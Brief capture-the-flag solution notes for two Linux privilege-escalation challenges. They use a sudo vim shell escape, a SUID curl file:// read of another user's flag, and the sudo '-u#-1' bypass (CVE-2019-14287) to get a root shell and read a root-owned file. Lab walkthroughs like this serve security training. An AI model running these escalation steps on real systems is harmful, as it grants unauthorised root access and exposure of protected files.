#1

Need read file

> sudo -l
See NOPASSWD: /usr/bin/vim
> sudo -S -u super-server /usr/bin/vim
> :e ..
and read file


OR

We see that the curl utility has SUID bit installed, and the owner of this file is super-server. we use this and read the file

> curl file:///home/super-server/user.txt


#2

Need read file in ROOT directory

> sudo -l
User reborn may run the following commands on host:
    (ALL, !root) NOPASSWD: /usr/bin/vim

> sudo -V 

This configuration setting is vulnerable to executing the specified command on behalf of the superuser if SUDO is installed with a version less than 1.8.28 CVE-2019-14287

> sudo -u#-1 vim

> :!/bin/bash

> id
uid=0(root) gid=1001(reborn) groups=1001(reborn)

> cat /root/home/root.txt
